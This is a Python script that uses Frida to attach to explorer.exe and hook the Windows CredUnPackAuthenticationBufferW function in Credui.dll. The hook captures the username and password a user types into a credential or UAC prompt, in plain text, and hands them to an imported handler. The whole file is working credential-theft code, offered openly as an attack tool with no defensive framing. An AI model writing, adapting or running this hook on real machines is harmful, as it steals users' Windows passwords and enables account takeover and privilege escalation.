from PyHook import wait_for_process, on_credential_submit
import frida
import sys


def wait_for():
    hook()


def hook():
    try:
        print("[+] Trying To Attach To Explorer")
        session = frida.attach("explorer.exe")
        print(f"[+] Attached To Explorer!")

        # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
        script = session.create_script("""

        var username;
        var password;
        var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

        Interceptor.attach(CredUnPackAuthenticationBufferW, {
            onEnter: function (args) 
            {

                username = args[3];
                password = args[7];
            },
            onLeave: function (result)
            {

                var user = username.readUtf16String()
                var pass = password.readUtf16String()

                if (user && pass)
                {
                    send("\\n=============================" + "\\n[+] Intercepted Creds from UAC" + "\\nUsername    : " + user + "\\nPassword    : " + pass +"\\n=============================" );
                }
            }
        });

        """)
        # If we found the user and pass then execute "on_message_credui" function
        script.on('message', on_credential_submit)
        script.load()
        sys.stdin.read()

    except Exception as e:
        print("[-] Unhandled exception: " + str(e))
        print("[-] Continuing...")
